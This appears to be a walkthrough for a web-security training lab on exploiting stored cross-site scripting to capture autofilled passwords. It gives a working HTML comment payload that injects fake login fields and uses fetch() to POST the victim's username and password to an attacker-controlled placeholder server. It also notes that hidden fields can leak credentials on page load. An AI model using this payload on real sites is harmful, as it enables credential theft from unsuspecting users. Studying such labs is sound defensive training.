# Lab 18 — Exploiting cross-site scripting to capture passwords

> **Practitioner** · [Official lab](https://portswigger.net/web-security/cross-site-scripting/exploiting-capturing-passwords)

**Entry point:** stored comment · **Goal:** capture the victim's credentials
from their browser's autofill.

## Solution

1. Browsers autofill saved credentials into any visible `username`/`password`
   inputs — inject fake ones above the real form via a comment:

```html
<input name=username placeholder="Username">
<input name=password type=password placeholder="Password"
  onchange="if(this.value.length)fetch('https://YOUR-EXPLOIT-SERVER-URL',{
    method:'POST', mode:'no-cors', body:username.value+':'+password.value})">
```

2. The victim's browser autofills both fields; any change (or your
   `onchange` on the password field) posts `user:pass` to the exploit server.
3. Check the exploit server **Access log** for the credentials, then log in
   as `administrator` — lab solved.

## Notes

Even without `onchange` (no user interaction), invisible inputs get autofilled
— pairs of inputs can be exfiltrated on page load.
